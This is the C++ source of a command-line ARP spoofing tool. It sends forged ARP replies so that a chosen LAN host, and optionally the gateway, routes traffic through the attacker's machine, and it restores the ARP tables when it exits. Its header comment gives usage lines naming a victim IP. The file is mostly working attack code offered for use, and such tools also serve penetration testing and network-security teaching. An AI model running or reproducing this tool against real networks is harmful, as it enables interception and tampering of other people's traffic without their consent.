//
// Created by kenny on 2/14/19.
//
/*
 * arp-spoof - perform LAN arp spoofing on a given host
 *
 * -t attack both gateway and the given host
 *
 * -n [seconds] between two packet
 *
 * -c [count] of packets to be sent
 *
 * -e [iface] device name
 *
 * sudo KNI_DEVNAME=wlan0
 * sudo arp-spoof 192.168.43.79 -c 5
 *
 * TODO Resolve MAC address for unknown hosts
 */

#include "hdrs.h"
#include "arpspf.h"


std::unique_ptr<kni::lan_info> lan(new kni::lan_info());
std::unique_ptr<kni::arp_io_packet> arp_io(new kni::arp_io_packet());

std::string victim_ip;
kni::mac_t victim_mac;
bool spoof_started = false, keep_running = true;

void restore_victim_arp();

void signal_stop_running(int);

int main(int argc, char *argv[]) {
    if (atexit(restore_victim_arp) != 0)
        KNI_FATAL_ERROR("Can not install exit function");

    struct sigaction sig_int_handler;

    sigemptyset(&sig_int_handler.sa_mask);
    sig_int_handler.sa_handler = signal_stop_running;
    sig_int_handler.sa_flags = 0;

    if (sigaction(SIGINT, &sig_int_handler, NULL) == -1)
        KNI_FATAL_ERROR("Can not install interrupt handler: %s", strerror(errno));

    int opt;
    int seconds = 10, npackets = 10;
    bool twoway = false;
    const char *devname = nullptr;
    while ((opt = getopt(argc, argv, "n:c:t:e:")) != -1) {
        switch (opt) {
            case 'n':
                seconds = atoi(optarg);
                break;
            case 'c':
                npackets = atoi(optarg);
                break;
            case 't':
                twoway = true;
                break;
            case 'e':
                devname = optarg;
                break;
            default:
                break;
        }
    }

    argc -= optind;
    argv += optind;

    if (seconds <= 0)
        KNI_FATAL_ERROR("Invalid arguments.");

    if (argc == 0)
        KNI_FATAL_ERROR("Missing an IP address.");

    if (devname == nullptr)
        KNI_FATAL_ERROR("Missing device name.");

    if (!lan->set_dev(devname) || !lan->update_gateway_ip() || !lan->fetch_arp())
        KNI_FATAL_ERROR("%s", lan->err());

    int temp;
    if (inet_pton(AF_INET, argv[0], &temp) == 0)
        KNI_FATAL_ERROR("\"%s\" doesn't contain a valid IPv4 address", argv[0]);
    else if (!lan->is_cached(argv[0]))
        KNI_FATAL_ERROR("Host %s not detected.", argv[0]);

    victim_ip.assign(argv[0]);
    victim_mac = lan->map(victim_ip);

    if (!arp_io->open(devname))
        KNI_FATAL_ERROR("failed to open device \"%s\" :%s", devname, arp_io->err());
    else
        KNI_LOG_DEBUG("device \"%s\" opened successfully.", devname);

    KNI_LOG_DEBUG("ip=%s secs=%d pkts=%d twoway=%d", victim_ip.c_str(), seconds, npackets, twoway);
    KNI_PRINTLN("Attacking %s(%s)...", victim_ip.c_str(), kni::to_string(victim_mac).c_str());

    int count = 0;
    while (keep_running) {
        auto succ = arp_io->reply(lan->gateway_ip, lan->dev.hw_addr, victim_ip, victim_mac);
        if (succ && twoway)
            succ = arp_io->reply(victim_ip, lan->dev.hw_addr, lan->gateway_ip, lan->gateway_mac);

        if (!succ)
            KNI_LOG_ERROR("%s", arp_io->err());
        spoof_started |= succ;

        if (++count == npackets) // If npackets < 0 then it becomes an infinite loop
            break;
        else
            sleep(static_cast<unsigned int>(seconds));
    }

    return 0;
}


void restore_victim_arp() {
    KNI_LOG_DEBUG("process exits...");
    if (spoof_started) {
        KNI_LOG_DEBUG("restoring ARP...");

        for (auto i = 0; i < 5; ++i) {
            sleep(2);   // Sleep before sending any packets
            bool succ = arp_io->reply(lan->gateway_ip, lan->gateway_mac, victim_ip, victim_mac);
            if (succ)
                succ = arp_io->reply(victim_ip, victim_mac, lan->gateway_ip, lan->gateway_mac);

            if (!succ)
                KNI_LOG_ERROR("%s", arp_io->err());
        }
    }

    arp_io->close();
    KNI_LOG_DEBUG("device closed.");
}

void signal_stop_running(int) {
    keep_running = false;
}
